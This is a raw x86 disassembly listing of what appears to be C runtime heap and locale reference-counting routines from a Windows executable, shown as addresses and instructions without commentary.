  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
